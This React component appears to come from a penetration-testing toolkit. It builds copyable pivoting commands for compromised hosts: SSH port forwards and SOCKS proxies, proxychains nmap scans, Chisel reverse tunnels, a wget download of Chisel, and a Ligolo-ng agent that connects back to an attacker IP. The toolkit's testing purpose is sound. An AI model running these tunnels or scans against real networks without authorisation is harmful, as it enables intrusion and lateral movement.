import { useState } from "react";

function Pivoting() {
  const [pivotHost, setPivotHost] = useState("");
  const [pivotUser, setPivotUser] = useState("");
  const [pivotPort, setPivotPort] = useState("22");
  const [targetHost, setTargetHost] = useState("");
  const [targetPort, setTargetPort] = useState("");
  const [localPort, setLocalPort] = useState("1080");
  const [technique, setTechnique] = useState("local");
  const [copied, setCopied] = useState(null);

  const ph = pivotHost || "<pivot-host>";
  const pu = pivotUser || "<user>";
  const pp = pivotPort || "22";
  const th = targetHost || "<target-host>";
  const tp = targetPort || "<target-port>";
  const lp = localPort || "1080";

  const TECHNIQUES = {
    local: {
      label: "Local Port Forward",
      description: "Forward a local port through the pivot to reach an internal service.",
      commands: [
        { label: "Basic local forward", cmd: `ssh -L ${lp}:${th}:${tp} ${pu}@${ph} -p ${pp}`, note: `Connect to localhost:${lp} to reach ${th}:${tp}` },
        { label: "Background / persistent", cmd: `ssh -fNL ${lp}:${th}:${tp} ${pu}@${ph} -p ${pp}`, note: "-fN runs in background without shell" },
        { label: "With keepalive", cmd: `ssh -o ServerAliveInterval=60 -L ${lp}:${th}:${tp} ${pu}@${ph} -p ${pp}` },
      ],
    },
    remote: {
      label: "Remote Port Forward",
      description: "Expose a local port on the pivot host (reverse tunnel).",
      commands: [
        { label: "Basic remote forward", cmd: `ssh -R ${tp}:localhost:${lp} ${pu}@${ph} -p ${pp}`, note: `${ph} can reach your localhost:${lp} via its port ${tp}` },
        { label: "Background remote forward", cmd: `ssh -fNR ${tp}:localhost:${lp} ${pu}@${ph} -p ${pp}` },
      ],
    },
    dynamic: {
      label: "Dynamic SOCKS Proxy",
      description: "Turn the pivot into a SOCKS5 proxy to route all traffic through it.",
      commands: [
        { label: "Open SOCKS5 proxy", cmd: `ssh -D ${lp} ${pu}@${ph} -p ${pp}`, note: `Configure proxychains to use SOCKS5 127.0.0.1:${lp}` },
        { label: "Background SOCKS proxy", cmd: `ssh -fND ${lp} ${pu}@${ph} -p ${pp}` },
        { label: "proxychains config line", cmd: `socks5 127.0.0.1 ${lp}`, note: "Add to /etc/proxychains.conf under [ProxyList]" },
        { label: "Run nmap through proxy", cmd: `proxychains nmap -sT -Pn ${th}`, note: "Only TCP connect scan works through proxychains" },
      ],
    },
    double: {
      label: "Double Pivot (Chain)",
      description: "Chain two SSH tunnels to reach a second internal network.",
      commands: [
        { label: "Step 1 — SOCKS through pivot 1", cmd: `ssh -fND ${lp} ${pu}@${ph} -p ${pp}` },
        { label: "Step 2 — SSH through pivot 1 to pivot 2", cmd: `proxychains ssh -D 1081 <user2>@${th}`, note: "Second SOCKS proxy on 1081 for inner network" },
        { label: "Step 3 — scan inner network", cmd: `proxychains4 -f proxychains2.conf nmap -sT -Pn <inner-target>` },
      ],
    },
    chisel: {
      label: "Chisel Tunnel",
      description: "HTTP-based tunnel — useful when SSH is blocked but HTTP/S is allowed.",
      commands: [
        { label: "Server (on pivot host)", cmd: `./chisel server --reverse --port 8080`, note: "Run on the compromised host" },
        { label: "Client — SOCKS proxy", cmd: `./chisel client ${ph}:8080 R:${lp}:socks`, note: `Creates SOCKS5 proxy on attacker localhost:${lp}` },
        { label: "Client — port forward", cmd: `./chisel client ${ph}:8080 R:${lp}:${th}:${tp}` },
        { label: "Download chisel (Linux)", cmd: `wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz && gunzip chisel_linux_amd64.gz && chmod +x chisel_linux_amd64` },
      ],
    },
    ligolo: {
      label: "Ligolo-ng",
      description: "Modern TUN-based pivot — routes traffic at the network level, no proxychains needed.",
      commands: [
        { label: "Start proxy (attacker machine)", cmd: `./proxy -selfcert -laddr 0.0.0.0:11601` },
        { label: "Run agent (pivot host)", cmd: `./agent -connect <attacker-ip>:11601 -ignore-cert` },
        { label: "In ligolo — start tunnel", cmd: `session\n[select session]\nstart`, note: "Then add route: ip route add 10.0.0.0/24 dev ligolo" },
        { label: "Add route to internal subnet", cmd: `sudo ip route add ${th}/24 dev ligolo` },
      ],
    },
  };

  const tech = TECHNIQUES[technique];

  const copyCmd = (cmd, i) => {
    navigator.clipboard.writeText(cmd);
    setCopied(i);
    setTimeout(() => setCopied(null), 1500);
  };

  return (
    <div>
      <h2 style={{ marginBottom: 10 }}>Pivoting</h2>
      <p style={{ color: "#94a3b8", marginBottom: 16 }}>
        Generate tunnel and pivot commands to route traffic through compromised hosts.
      </p>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 10, marginBottom: 12 }}>
        <Field label="Pivot Host" value={pivotHost} onChange={setPivotHost} placeholder="10.10.10.5" />
        <Field label="Pivot User" value={pivotUser} onChange={setPivotUser} placeholder="root" />
        <Field label="Pivot SSH Port" value={pivotPort} onChange={setPivotPort} placeholder="22" />
        <Field label="Target Host" value={targetHost} onChange={setTargetHost} placeholder="192.168.1.10" />
        <Field label="Target Port" value={targetPort} onChange={setTargetPort} placeholder="3306" />
        <Field label="Local Port" value={localPort} onChange={setLocalPort} placeholder="1080" />
      </div>

      <div style={{ marginBottom: 16 }}>
        <label style={{ display: "block", marginBottom: 6, color: "#94a3b8", fontSize: 13 }}>Pivot Technique</label>
        <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
          {Object.entries(TECHNIQUES).map(([key, t]) => (
            <button key={key} onClick={() => setTechnique(key)} style={{
              padding: "6px 12px", borderRadius: 6, fontSize: 13, cursor: "pointer",
              background: technique === key ? "#0f172a" : "#020617",
              color: technique === key ? "#38bdf8" : "#64748b",
              border: technique === key ? "1px solid #38bdf8" : "1px solid #1e293b",
            }}>
              {t.label}
            </button>
          ))}
        </div>
      </div>

      <div style={descCard}>
        <span style={{ color: "#38bdf8", fontWeight: 600, fontSize: 13 }}>{tech.label} — </span>
        <span style={{ color: "#94a3b8", fontSize: 13 }}>{tech.description}</span>
      </div>

      <h3 style={{ color: "#38bdf8", marginBottom: 10 }}>Commands</h3>
      {tech.commands.map((c, i) => (
        <div key={i} style={cmdCard}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
            <span style={{ color: "#64748b", fontSize: 12 }}>{c.label}</span>
            <button onClick={() => copyCmd(c.cmd, i)} style={{
              background: copied === i ? "#22c55e" : "#1e293b",
              color: copied === i ? "#0f172a" : "#94a3b8",
              border: "none", borderRadius: 4, padding: "3px 10px",
              fontSize: 11, cursor: "pointer", transition: "0.2s",
            }}>
              {copied === i ? "Copied!" : "Copy"}
            </button>
          </div>
          <pre style={{ margin: 0, fontFamily: "monospace", fontSize: 13, color: "#e2e8f0", whiteSpace: "pre-wrap", wordBreak: "break-all" }}>
            {c.cmd}
          </pre>
          {c.note && <p style={{ margin: "6px 0 0", color: "#64748b", fontSize: 12 }}>💡 {c.note}</p>}
        </div>
      ))}
      <p style={{ color: "#475569", fontSize: 12, marginTop: 16 }}>
        ⚠ For authorized penetration testing only.
      </p>
    </div>
  );
}

function Field({ label, value, onChange, placeholder }) {
  return (
    <div>
      <label style={{ display: "block", marginBottom: 4, color: "#94a3b8", fontSize: 12 }}>{label}</label>
      <input
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        style={{
          width: "100%", padding: "7px 10px", borderRadius: 6,
          background: "#020617", border: "1px solid #1e293b",
          color: "#e2e8f0", boxSizing: "border-box", fontSize: 13,
        }}
      />
    </div>
  );
}

const descCard = {
  background: "#0f172a", border: "1px solid #1e293b",
  borderRadius: 8, padding: "10px 14px", marginBottom: 20,
};
const cmdCard = {
  background: "#0a0f1a", border: "1px solid #1e293b",
  borderRadius: 8, padding: "12px 14px", marginBottom: 10,
};

export default Pivoting;
